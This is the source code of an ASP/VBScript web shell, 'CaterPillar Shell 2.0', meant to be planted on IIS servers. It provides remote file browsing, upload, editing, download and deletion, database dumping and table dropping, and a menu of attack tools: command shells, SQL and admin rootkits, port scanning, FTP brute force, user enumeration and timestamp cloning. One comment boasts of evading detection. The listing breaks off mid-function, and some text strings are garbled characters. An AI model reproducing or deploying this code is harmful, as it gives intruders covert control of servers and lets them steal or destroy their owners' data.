<%@ Language=VBScript %>
<!-- #include file="upload.asp" -->
<%
Server.ScriptTimeout=999999999
Response.Buffer =true
Dim objFSO,hu
Set objFSO = CreateObject ("Scripting.FileSystemObject")
dim DimFileExt
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Dim uploadsDirVar
Dim objNet,strComputerName,strUserDomain,strUserName
Set objNet = Server.CreateObject("WSCRIPT.NETWORK")
strComputerName = objNet.ComputerName
strUserDomain = objNet.UserDomain
strUserName = objNet.UserName
Set objNet = Nothing 
%>
<%
if request.QueryString("action")="down" then
		downTheFile(request.QueryString("src"))
		response.End()
end if
Set hu = request.QueryString("action")
    If hu = "cmd" Then
        TITLE = "CMD.NET"
    ElseIf hu = "cmdw32" Then
        TITLE = "ASP.NET W32 Shell"
    ElseIf hu = "cmdwsh" Then
        TITLE = "ASP.NET WSH Shell"
    ElseIf hu = "sqlrootkit" Then
        TITLE = "SqlRootKit.NET"
    ElseIf hu = "PortScan" Then
        TITLE = "Port Scan"
    ElseIf hu = "FtpBrute" Then
        TITLE = "Ftp Brute"
    ElseIf hu = "UserEnumLogin" Then
        TITLE = "User Enum Login"
    ElseIf hu = "clonetime" Then
        TITLE = "Clone Time"
    ElseIf hu = "information" Then
        TITLE = "Web Server Info"
    ElseIf hu = "goto" Then
        TITLE = "CaterPillar Shell 2.0"
    ElseIf hu = "prolist" Then
        TITLE = "List processes from server"
    ElseIf hu = "ListUser" Then
        TITLE = "List User Accounts"
    ElseIf hu = "applog" Then
        TITLE = "List Application Event Log Entries"
    ElseIf hu = "syslog" Then
        TITLE = "List System Event Log Entries"
    ElseIf hu = "auser" Then
        TITLE = "IIS List Anonymous' User details"
    ElseIf hu = "ipconfig" Then
        TITLE = "Ip Configuration"
    ElseIf hu = "homedirectory" Then
        TITLE = "Home Directory"
    ElseIf hu = "HttpFinger" Then
        TITLE = "Finger Print"
    ElseIf hu = "localgroup" Then
        TITLE = "Local Group"
	ElseIf hu = "DbManager" Then
        TITLE = "Dbase Manager"
	ElseIf hu = "DbEnumerate" Then
        TITLE = "Enumerate SQL Databases"
	ElseIf hu = "DbEnumerateLogin" Then
        TITLE = "User SQL Enum Login"
    Else
        TITLE = Request.ServerVariables("HTTP_HOST")
    End If
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<style type="text/css">
body,td,th {
	color: #000000;
	font-family: Verdana;
}
body {
	background-color: #ffffff;
	font-size:12px; 
}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.style3 {color: #FF0000}
</style>

<head>
<script language=javascript>
function DeleteFile()
{
if(confirm("Are you sure?")){return true;}
else{return false;}
}
function down()
{
if(confirm("If the file size > 20M,\nPlease don\'t download\nYou can copy file to web directory ,use http download\nAre you sure download?")){return true;}
else{return false;}
}
function DbCheck()
{
if(FormDbManager.DbStr.value == "")
{
alert("String Connection is Null");
FullDbStr(0);
return false;
}
return true;
}

function onSubmitFormUpload() {
    var formDOMObj = document.UploadFileForm;
    if (formDOMObj.attach1.value == "" && formDOMObj.attach2.value == "" && formDOMObj.attach3.value == "" && formDOMObj.attach4.value == "" )
        alert("Please press the Browse button and pick a file.")
    else
        return true;
    return false;
}
function FullDbStr(i)
{
if(i<0)
{
return false;
}
Str = new Array(12);
Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%response.Write ServerIP%>\\db.mdb;Jet OLEDB:Database Password=***";
Str[1] = "Driver={Sql Server};Server=<%response.Write ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=password";
Str[2] = "Driver={MySql};Server=<%response.Write ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=password";
Str[3] = "Dsn=DsnName";
Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')";
Str[6] = "DELETE FROM [TableName] WHERE ID=100";
Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";
Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
Str[9] = "DROP TABLE [TableName]";
Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
Str[12]= "no no no";
if(i<=3)
{
FormDbManager.DbStr.value = Str[i];
FormDbManager.SqlStr.value = "";
abc.innerHTML="<center>yes yes yes</center>";
}
else if(i==12)
    {
     alert(Str[i]);
    }
else
{
FormDbManager.SqlStr.value = Str[i];
}
return true;
}

function FullSqlStr(str,pg)
{
if(FormDbManager.DbStr.value.length<5)
{
alert("??¼?²??ý¾????¬½?´®??·??ý?·!");
return false;
}
if(str.length<10)
{
alert("??¼?²?SQL??¾???·??ý?·!");
return false;
}
FormDbManager.SqlStr.value = str;
FormDbManager.Page.value = pg;
abc.innerHTML="";
FormDbManager.submit();
return true;
}
function LocalGroup()
   {
   var w = document.LocalGroupForm.StrBtn.selectedIndex;
   var selected_text = document.LocalGroupForm.StrBtn.options[w].text;
   LocalGroupForm.GroupStr.value = selected_text;
   }

</script>
<meta http-equiv="Content-Type" content="text/html">
<title><%=TITLE%></title>
</head>

<body>
<div align="center">CaterPillar Shell 2.0 By Pillar </div>
<hr>
<%
	dim temp
	temp=request.QueryString("action")
	if temp="" then temp="goto"
	select case temp
	case "goto"
		if request.QueryString("src")<>"" then
			url=request.QueryString("src")
		else
			url=server.MapPath(".") & "\"
		end if
	call existdir(url)
	dim xdir
	SET CF=CreateObject("Scripting.FileSystemObject")
	Set mydir=CF.GetFolder(url)
	dim hupo
	dim xfile
	
		
%>
<table width="90%"  border="0" align="center">
  <tr>
  	<td>Currently Dir:</td> <td><font color=red><%=url%></font></td>
  </tr>
  <tr>
    <td width="13%">Operate:</td>
    <td width="87%"><a href="?action=NewFile&src=<%=server.UrlEncode(url)%>" title="New file or directory">New</a> - 
      <%if session("cutboard")<>"" then%>
      <a href="?action=paste&src=<%=server.UrlEncode(url)%>" title="you can paste">Paste</a> - 
      <%else%>
	Paste - 
<%end if%>
<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file">UpLoad</a> - <a href="?action=searchfile&src=<%=server.UrlEncode(url)%>" title="Search file">Search</a> - <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">GoBackDir </a> - <a href="?action=logout" title="Exit">Quit</a></td>
</tr>
<tr><td>Go to:</td>
<td>
<%
for each drive_ in objFSO.Drives
		response.Write("<a href='?action=goto&src=" & drive_.DriveLetter & "%3A%5C" & "'>" & drive_.DriveLetter & "</a>")
		if drive_.Drivetype=1 then Response.write "&nbsp;Floppy [" & drive_.DriveLetter & ":]&nbsp;-&nbsp;"
		if drive_.Drivetype=2 then Response.write "&nbsp;HardDisk [" & drive_.DriveLetter & ":]&nbsp;-&nbsp;"
		if drive_.Drivetype=3 then Response.write "&nbsp;Remote HDD [" & drive_.DriveLetter & ":]&nbsp;-&nbsp;"
		if drive_.Drivetype=4 then Response.write "&nbsp;CD-Rom [" & drive_.DriveLetter & ":]&nbsp;-&nbsp;"
		Response.Write "</a>"
	next
%>
 <a href="?action=goto&src=C%3a%5cProgram%20Files%5c" title="Program Files">Program Files</a> - <a href="?action=goto&src=C%3a%5cDocuments%20and%20Settings%5c" title="Documents and Settings">Documents and Settings</a>  - <a href="?action=goto&src=C%3a%5cwindows%5cTemp%5c" title="Temp">Temp</a>
</td>
</tr>
  <tr>
    <td>Data Base:</td>
    <td><a href="?action=DbManager" >Databases Manager </a> - <a href="?action=DbEnumerate" >Enumerate SQL Databases </a> - <a href="?action=DbEnumerateLogin" >User SQL Enum Login </a></td>    
  </tr>
  <tr>
    <td>Tool:</td>
    <td><a href="?action=sqlrootkit" >SqlRootKit.NET </a> - <a href="?action=adminrootkit" >AdminRootKit</a> - <a href="?action=cmd" >CMD.NET</a>  - <a href="?action=PortScan" >Port Scan</a> - <a href="?action=FtpBrute" >Ftp Brute</a> - <a href="?action=UserEnumLogin" >User Enum Login</a> - <a href="?action=cmdw32" >kshellW32</a> - <a href="?action=cmdwsh" >kshellWSH</a> - <a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" >CloneTime</a> - <a href="?action=information" >System Info</a> - <a href="?action=prolist" >List Processes</a> - <a href="?action=regshell" >Registry Shell</a></td>    
  </tr>
  <tr>
    <td> </td>
    <td><a href="?action=applog" >Application Event Log </a> - <a href="?action=ListUser" >List User Accounts</a> - <a href="?action=syslog" >System Log</a> - <a href="?action=auser" >IIS List Anonymous' User details</a> - <a href="?action=ipconfig" >Ip Configuration</a> - <a href="?action=localgroup" >Local Group</a> - <a href="?action=homedirectory" >User Home Directory </a></td>    
  </tr>
  <tr>
  <td> </td>
    <td><a href="?action=HttpFinger" >Http Finger </a></td>
    </tr>
</table>
<hr>
<table width="100%"  border="0" align="center">
	<tr>
	<td width="20%"><strong>Name</strong></td>
	<td width="10%"><strong>Size</strong></td>
	<td width="20%"><strong>Type</strong></td>
	<td width="13%"><strong>ModifyTime</strong></td>
	<td width="20%"><strong>Operate</strong></td>
	</tr>
      <tr>
        <td><%
		hupo= "<tr><td><a href='?action=goto&src="&server.UrlEncode(Getparentdir(url))&"'><i>|Parent Directory|</i></a></td></tr>"
		response.Write(hupo)
		For Each xdir in mydir.subfolders
			response.Write("<tr>")
			dim filepath 
			filepath=server.UrlEncode(url & "\" & xdir.name)
			hupo= "<td><a href='?action=goto&src=" & filepath & "%5C" & "'>" & xdir.name & "</a></td>"
			response.Write(hupo)
			response.Write("<td><dir></td>")
			response.Write("<td>File Folder</td>")
			response.Write("<td>" & xdir.DateLastModified & "</td>")
			hupo="<td><a href='?action=cut&src=" & filepath & "%5C'  target='_blank'>Cut" & "</a>|<a href='?action=copy&src=" & filepath & "%5C'  target='_blank'>Copy</a>|<a href='?action=DeleteFile&src=" & filepath & "%5C'" & " onclick='return DeleteFile(this);'>Del</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
		%></td>
  </tr>
		<tr>
        <td><%
		for each xfile in mydir.files
			dim filepath2
			filepath2=server.UrlEncode(url & "\" & xfile.name)
			response.Write("<tr>")
			hupo="<td>" & xfile.name & "</td>"
			response.Write(hupo)
			hupo="<td>" & clng(xfile.size/1024) & "</td>"
			response.Write(hupo)
			hupo="<td>" & xfile.Type & "</td>"
			response.Write(hupo)
			response.Write("<td>" & xfile.DateLastModified & "</td>")
			hupo="<td><a href='?action=EditFile&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=DeleteFile&src=" & filepath2 & "' onClick='return DeleteFile(this);'>Del</a></td>"			
			response.Write(hupo)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%></td>
      </tr>
</table>

<%
    case "regshell":regshell()
    case "PortScan":PortScan()
	case "sqlrootkit":sqlrootkit()
	case "adminrootkit":adminrootkit()
	case "information":information()
	case "homedirectory":homedirectory()
	case "ipconfig":ipconfig()
	case "localgroup":localgroup()
	case "FtpBrute":FtpBrute()
	case "DbManager":DbManager()
	case "DbEnumerate":DbEnumerate()
	case "DbEnumerateLogin":DbEnumerateLogin()
	case "UserEnumLogin":UserEnumLogin()
	case "cmd":cmd()
	case "ListUser":ListUser()
	case "prolist":prolist()
	case "LocalGroup"
	    dim StrLocalGroup,StrHostname
	    StrLocalGroup=request.QueryString("src")
	    StrHostname=request.QueryString("Hostname")
	    call RunUserLocalGroup(StrLocalGroup,StrHostname)
	case "BackupTable"
	    dim StrConnectionBackup,StrBackupTable,StrBackupPage
	    StrConnectionBackup=request.QueryString("DbStr")
	    StrBackupTable=request.QueryString("src")
	    StrBackupPage=request.QueryString("Page")
	    StrBackupPageSize=request.QueryString("PageSize")
	    call TableBackup(StrConnectionBackup,StrBackupTable,StrBackupPage,StrBackupPageSize)
	case "EditTable"
	    dim StrConnectionEdit,StrEditTable,StrEditPage
	    StrConnectionEdit=request.QueryString("DbStr")
	    StrEditTable=request.QueryString("src")
	    StrEditPage=request.QueryString("Page")
	    call TableEdit(StrConnectionEdit,StrEditTable,StrEditPage)
	case "ExportTable"
	    dim StrConnectionExport,StrExportTable,StrExportPageSize
	    StrConnectionExport=request.QueryString("DbStr")
	    StrExportTable=request.QueryString("src")
	    StrExportPageSize=request.QueryString("PageSize")
	    call TableExport(StrConnectionExport,StrExportTable,StrExportPageSize)
	case "DeleteTable"
	    dim StrConnectionDelete,StrDeleteTable
	    StrConnectionDelete=request.QueryString("DbStr")
	    StrDeleteTable=request.QueryString("src")
	    call TableDelete(StrConnectionDelete,StrDeleteTable)
	    response.Write("<script>alert(""Delete " & replace(a,"\","\\") & " Success!"");location.href='"& request.ServerVariables("URL") & "?action=DbManager&DbStr="& StrConnectionDelete &"'</script>")
	case "searchfile"
		dim f
		f=request.QueryString("src")
		call existdir(f)
		call Search(f)
	case "upfile"
	     dim e
         e=request.QueryString("src")
         call existdir(e)
         call Upload(e)
	case "NewFile"
	    dim c
		c=request.QueryString("src")
		call existdir(c)
		call Create(c)
	case "EditFile"
	    dim b
		b=request.QueryString("src")
		call existdir(b)
		call Edit(b)
		
	case "DeleteFile"
		dim a
		a=request.QueryString("src")
		call existdir(a)
		call Del(a)  
		response.Write("<script>alert(""Delete " & replace(a,"\","\\") & " Success!"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
	end select
Sub TableBackup(Connection,Table,Page,PageSize)
    dim SqlStr
    SqlStr = "SELECT * FROM [" & Table & "]"
	Set Conn=Server.CreateObject("ADODB.Connection")
    Conn.Open Connection
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=PageSize
    Count=Rs.PageSize
    PN=Rs.PageCount
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    Response.Clear()
    Response.Buffer = True
    Response.AddHeader "Content-Disposition", "attachment;filename=export_"&Table&"_"&Page&".xls"  
    Response.ContentType = "application/vnd.ms-excel"
    Response.write "<table><tr height=25 bgcolor=#cccccc>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      Response.write "<td align='center'>" & Fld.Name & "</td>"
      Set Fld=nothing
    Next
    Response.write "</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    Response.write "<td bgcolor=" & Bgcolor & ">" & ColInfo & "</td>"
	  Next
	  Response.write "</tr>"
      Rs.MoveNext
    Loop
	SqlStr=HtmlEnCode(SqlStr)
    Response.write "</table>"
    Response.End()
    Rs.Close:Set Rs=Nothing
    Conn.Close
    Set Conn=Nothing
End Sub
Sub TableExport(Connection,Table,PageSize)
    dim SqlStr
    SqlStr = "SELECT * FROM [" & Table & "]"
	Set Conn=Server.CreateObject("ADODB.Connection")
    Conn.Open Connection
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=PageSize
    Count=Rs.PageSize
    PN=Rs.PageCount
            
	SqlStr=HtmlEnCode(SqlStr)
  '  Response.write "<tr><td colspan=" & FN+1 & " align=center>Record&nbsp;" & RC & "&nbsp;Page&nbsp;" & Page & "/" & PN
    If PN>1 Then
      For i=1 To PN
        If i>PN Then Exit For
          Response.write "<span class='buttom'><a href='?action=BackupTable&src=" & Table & "&PageSize="&PageSize&"&Page="&i&"&DbStr=" & Connection & "'>"&Table&"_"&i&"</a></span>&nbsp;"
      Next
    End If
    Response.write "</td></tr></table>"
    Rs.Close:Set Rs=Nothing
    Conn.Close
    Set Conn=Nothing
End Sub
Sub TableDelete(Connection,Table)
    dim SqlStr
    SqlStr = "DROP TABLE [" & Table & "]"
	Set Conn=Server.CreateObject("ADODB.Connection")
    Conn.Open Connection
    Conn.Execute(SqlStr)
    Conn.Close
    Set Conn=Nothing
end sub
Sub TableEdit(Connection,Table,Page)
    dim SqlStr
    SqlStr = "SELECT * FROM [" & Table & "]"
	Set Conn=Server.CreateObject("ADODB.Connection")
    Conn.Open Connection
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=100
    Count=Rs.PageSize
    PN=Rs.PageCount
    'Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    Response.write "<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      Response.write "<td align='center'>" & Fld.Name & "</td>"
      Set Fld=nothing
    Next
    Response.write "</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  Response.write "<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    Response.write "<td bgcolor=" & Bgcolor & ">" & ColInfo & "</td>"
	  Next
	  Response.write "</tr>"
      Rs.MoveNext
    Loop
	SqlStr=HtmlEnCode(SqlStr)
    Response.write "<tr><td colspan=" & FN+1 & " align=center>Record&nbsp;" & RC & "&nbsp;Page&nbsp;" & Page & "/" & PN
    If PN>1 Then
      Response.write "&nbsp;&nbsp;<a href='?action=EditTable&src=" & Table & "&Page=1&DbStr=" & Connection & "'>First</a>&nbsp;<a href='?action=EditTable&src=" & Table & "&Page="&Page-1&"&DbStr=" & Connection & "'>Previous</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        Response.write i & "&nbsp;"
        Else
        Response.write "<span class='buttom'><a href='?action=EditTable&src=" & Table & "&Page="&i&"&DbStr=" & Connection & "'>"&i&"</a></span>&nbsp;"
        End If
      Next
	  Response.write "&nbsp;<a href='?action=EditTable&src=" & Table & "&Page="&Page+1&"&DbStr=" & Connection & "'>Next</a>&nbsp;<a href='?action=EditTable&src=" & Table & "&Page="&PN&"&DbStr=" & Connection & "'>Last</a>"
    End If
    Response.write "<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
    Conn.Close
    Set Conn=Nothing
End Sub
Sub downTheFile(thePath)
		Response.Clear
        Set OSM = Server.CreateObject("Adodb.Stream")
        OSM.Open
        OSM.Type = 1
        OSM.LoadFromFile thePath
        sz=InstrRev(thePath,"\")+1
        Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(thePath,sz)
        Response.AddHeader "Content-Length", OSM.Size
        Response.Charset = "UTF-8"
        Response.ContentType = "application/octet-stream"
        Response.BinaryWrite OSM.Read
        Response.Flush
        OSM.Close
        Set OSM = Nothing
End Sub
Sub Search(Path)
         if request.Form("Searchpath")="" then
               Searchpath=Path
         else
               Searchpath=request.Form("Searchpath")
         end if
		 if request.Form("Search_File")="" then
               Search_File="*.asp;*.cer;*.asa;*.cdx"
         else
               Search_File=request.Form("Search_File")
         end if
		 Search_Content=request.Form("Search_Content")
         response.Write "<p>[ Search File for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href='javascript:history.back(1);'>Back</a></i></p>"
         response.Write "<p> Search File with ASP account(<span class='style3'>Notice: only click 'Search' to Start Search</span>)</p>"
         response.Write "<p>- This function has fixed by Cater Pillar has not detected (2009/05/24)-</p>"
         response.Write "<form name='SearchFileForm' method='post' action='' onSubmit='SearchFileForm.submit.disabled=true;'>"
         response.Write "Path :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name='Searchpath' type='text' id='Searchpath' class='TextBox' value='"&Searchpath&"' size='50'/><br>"
		 response.Write "File Name  :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name='Search_File' type='text' id='Search_File' class='TextBox' value='"&Search_File&"' size='50'/><br>"
		 response.Write "Search Content  : <input name='Search_Content' type='text' id='Search_Content' class='TextBox' value='"&Search_Content&"' size='50'/>&nbsp;"
		 response.Write "<input name='SearchFileSubit' type='submit' id='SearchFileSubit' value='Search' class='buttom' /></FORM>"
		 If request.Form("SearchFileSubit") <> "" Then
		    Searchpath=request.Form("Searchpath")
			Search_Content=request.Form("Search_Content")
			if Searchpath<>"" then
				   DimFileExt = request.Form("Search_File")
				   response.Write "<hr><table width='100%'  border='3' align='center'><tr><td width='20%'><strong>Name</strong></td><td width='10%'><strong>Size</strong></td>	<td width='20%'><strong>Type</strong></td><td width='13%'><strong>ModifyTime</strong></td><td width='20%'><strong>Operate</strong></td></tr>"
			       Call SearchAllFile(Searchpath,Search_Content)
				   response.Write "</table>"
			end if
		end if
end sub
Sub SearchAllFile(Path,Search_Content)
	Set F1SO = CreateObject("Scripting.FileSystemObject")
	if not F1SO.FolderExists(Path) then exit sub
	Set f = F1SO.GetFolder(Path)
	on error resume next
	err.clear
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F1SO.GetExtensionName(Path&"\"&myfile.name),myfile.name) Then
			filepath2=server.UrlEncode(Path & "\" & myfile.name)
			If Search_Content<>"" Then
			     if SearchFileContent(Path & "\" & myfile.name,Search_Content) Then
				       response.Write("<tr>")
			           response.Write("<td>" & myfile.name & "</td>")
			           response.Write("<td>" & clng(myfile.size/1024) & "</td>")
			           response.Write("<td>" & myfile.Type & "</td>")
			           response.Write("<td>" & myfile.DateLastModified & "</td>")
			           response.Write("<td><a href='?action=EditFile&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=DeleteFile&src=" & filepath2 & "' onClick='return DeleteFile(this);'>Del</a></td>")
			           response.Write("</tr>")
			           SumFiles = SumFiles + 1
				  end if
			Else
			      response.Write("<tr>")
			      response.Write("<td>" & myfile.name & "</td>")
			      response.Write("<td>" & clng(myfile.size/1024) & "</td>")
			      response.Write("<td>" & myfile.Type & "</td>")
			      response.Write("<td>" & myfile.DateLastModified & "</td>")
			      response.Write("<td><a href='?action=EditFile&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=DeleteFile&src=" & filepath2 & "' onClick='return DeleteFile(this);'>Del</a></td>")
			      response.Write("</tr>")
			      SumFiles = SumFiles + 1
			End if
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		SearchAllFile Path&"\"&f1.name,Search_Content
		SumFolders = SumFolders + 1
    Next
	Set F1SO = Nothing
	Set f = Nothing
	Set fc2 = Nothing
End Sub
Function CheckExt(FileExt,FileName)
	If DimFileExt = "*.*" Then CheckExt = True
	Ext = Split(DimFileExt,";")
	For i = 0 To Ubound(Ext)
		If Lcase("*."&FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
	If DimFileExt = FileName Then CheckExt = True
End Function
Function SearchFileContent(FilePath, InFile)
    set FSO1s = CreateObject("Scripting.FileSystemObject")
	on error resume next
	set ofile = FSO1s.OpenTextFile(FilePath)
	strFileContents = ofile.ReadAll
	If err Then Exit Function end if
	    If InStr(1,strFileContents,LCase(InFile),1) then
	       SearchFileContent = True
	    End If
	    ofile.Close
	 Set FSO1s = Nothing
	 Set ofile = Nothing 
End Function
Sub Upload(Path)
        uploadsDirVar = Path
        if Request.ServerVariables("REQUEST_METHOD") = "POST" then
        call SaveFiles()
        response.Write("<script>alert('Files upload success!\n\nSave Path:" & replace(Path,"\","\\") & "\n');")
	    response.Write("location.href='" & request.ServerVariables("URL") & "?action=goto&src=" & server.UrlEncode(request.QueryString("src")) & "'</sc" & "ript>")
        end if
        response.Write "<form name='UploadFileForm' method='POST' enctype='multipart/form-data' action='"&request.ServerVariables("URL")&"?action=upfile&src=" & server.UrlEncode(request.QueryString("src")) & "' onSubmit='return onSubmitFormUpload();'>"
      	response.Write "You will upload files to this directory : <span class='style3'>" & Path & "</span><br>"
		response.Write "choose file names from your computer .<br>"
		response.Write "File 1: <input name='attach1' type='file' class='TextBox' size=35><br>"
        response.Write "File 2: <input name='attach2' type='file' class='TextBox' size=35><br>"
        response.Write "File 3: <input name='attach3' type='file' class='TextBox' size=35><br>"
        response.Write "File 4: <input name='attach4' type='file' class='TextBox' size=35><br>"
        response.Write "File 5: <input name='attach5' type='file' class='TextBox' size=35><br>"
        response.Write "&nbsp;<input name='UpFileSubit' type='submit' id='UpFileSubit' value='Upload' class='buttom' /></FORM>"
        response.Write "<a href='javascript:history.back(1);' style='color:#FF0000'>Go Back</a>"
End Sub
function SaveFiles
    Dim Upload, fileName, fileSize, ks, i, fileKey
    Set Upload = New FreeASPUpload
    Upload.Save(uploadsDirVar)

	If Err.Number<>0 then Exit function

    SaveFiles = ""
    ks = Upload.UploadedFiles.keys
    if (UBound(ks) <> -1) then
        SaveFiles = "<B>Files uploaded:</B> "
        for each fileKey in Upload.UploadedFiles.keys
            SaveFiles = SaveFiles & Upload.UploadedFiles(fileKey).FileName & " (" & Upload.UploadedFiles(fileKey).Length & "B) "
        next
    end if
end function
Sub Create(Path)
    SET CF=CreateObject("Scripting.FileSystemObject")
        response.Write "<form name='CreateFileForm' method='post' action='' onSubmit='CreateFileForm.submit.disabled=true;'>"
		response.Write(Path & "<br>")
		response.Write "Name:<input name='NewName' type='text' id='NewName' class='TextBox' /><br>"
		response.Write "<input id='NewFile' type='radio' name='New' value='NewFile' checked='checke' /><label for='NewFile'>File   </label>"
        response.Write "<input id='NewDirectory' type='radio' name='New' value='NewDirectory' /><label for='NewDirectory'>Directory</label><br>"
		response.Write "<input name='submit' type='submit' class='buttom' value=' Submit '>"
        response.Write "<input name='Submit' type='hidden' id='Submit' value='111'></FORM>"
		response.Write "<a href='javascript:history.back(1);' style='color:#FF0000'>Go Back</a>"
		If request.Form("Submit") <> "" Then
		NewName=request.Form("NewName")
		    if NewName<>"" then
			    If request.Form("New") = "NewFile" Then
				    If Not CF.FileExists(Path & NewName) Then
				          Set T=CF.CreateTextFile(Path & NewName)
						  T.WriteLine " "
				          T.close
						  response.Redirect(request.ServerVariables("URL") & "?action=EditFile&src=" & server.UrlEncode(Path & NewName))
						  Set T=nothing
				    Else
				          response.Write "<script>alert('File " & replace(Path & NewName ,"\","\\") & " have existed , Creat fail!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>"
				    end if
				else
				  If Not CF.FolderExists(Path & NewName) Then
				      CF.CreateFolder Path & NewName
				      response.Write "<script>alert('Creat directory " & replace(Path & NewName ,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>"
				   Else
				      response.Write "<script>alert('directory " & replace(Path & NewName ,"\","\\") & " have existed , Creat fail!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>"
				   end if
				end if
			else
				If request.Form("New") = "NewFile" Then
				response.Write "<script>alert('please insert file name')</script>"
				else
				response.Write "<script>alert('please insert directory name')</script>"
				end if
		    end if
		end if
    SET CF = NOTHING
End Sub
Sub Del(Path)
    SET CF=CreateObject("Scripting.FileSystemObject")
	   if right(Path,1)="\" then
		  dim xdir
		  dim mydir
		  Set mydir=CF.GetFolder(Path)
 		  dim xfile
		  for each xfile in mydir.subfolders
		      response.Write Path & xfile.name
			  If CF.FileExists(Path & xfile.name) Then
                 CF.DeleteFile(Path & xfile.name)
	          end if
		  next
		'  for each xdir in mydir.getdirectories()
		'	  call del(Path & xdir.name & "\")
		 ' next
		  If CF.FolderExists(Path) Then
	          CF.DeleteFolder(Path)
		  end if
	    else
	       If CF.FileExists(Path) Then
              CF.DeleteFile(Path)
	       end if
	    end if
    SET CF = NOTHING
End Sub
Function Edit(Path)
    SET CF=CreateObject("Scripting.FileSystemObject")
     If Request("Action2")="Post" Then
          Set T=CF.CreateTextFile(Path)
          T.WriteLine Request.form("content")
          T.close
          Set T=nothing
          response.Write "<center><br><br><br>??¼þ±£´?³?¹¦£?</center>"
      End If
     If Path<>"" Then
